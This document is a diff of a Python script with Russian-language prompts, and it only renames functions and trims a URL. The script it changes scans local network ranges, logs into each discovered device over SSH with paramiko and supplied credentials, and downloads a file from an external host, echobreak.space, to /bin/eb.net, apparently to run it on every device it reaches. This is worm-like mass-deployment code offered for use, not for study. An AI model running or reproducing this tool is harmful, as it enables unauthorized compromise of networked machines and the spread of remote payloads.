@@ -6,7 +6,7 @@ import time
 import os
 
 
-def get_local_devices(network_range):
+def getLocalDevices(network_range):
     print(f"[*] Сканируем сеть {network_range}...")
     devices = []
 
@@ -28,7 +28,7 @@ def get_local_devices(network_range):
     return devices
 
 
-def download_and_run(ip, username, password, file_url, target_path):
+def downloadAndRun(ip, username, password, file_url, target_path):
     try:
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -64,7 +64,7 @@ if __name__ == "__main__":
     FILE_URL = input(
         "Введите URL для загрузки файла (или Enter для использования https://echobreak.space/downloads/eb.net): ").strip()
     if not FILE_URL:
-        FILE_URL = "https://echobreak.space/downloads/eb.net "
+        FILE_URL = "https://echobreak.space/downloads/eb.net"
 
     TARGET_PATH = "/bin/eb.net"
 
@@ -81,7 +81,7 @@ if __name__ == "__main__":
 
     all_devices = []
     for network in NETWORK_RANGES:
-        devices = get_local_devices(network)
+        devices = getLocalDevices(network)
         all_devices.extend(devices)
         print(f"[*] Найдено устройств в {network}: {len(devices)}")
 
@@ -91,7 +91,7 @@ if __name__ == "__main__":
 
         print(f"[*] Начинаем обработку {len(all_devices)} устройств...")
         for ip in tqdm(all_devices, desc="Обработка устройств", total=len(all_devices)):
-            if download_and_run(ip, SSH_USERNAME, SSH_PASSWORD, FILE_URL, TARGET_PATH):
+            if downloadAndRun(ip, SSH_USERNAME, SSH_PASSWORD, FILE_URL, TARGET_PATH):
                 success_count += 1
             else:
                 fail_count += 1
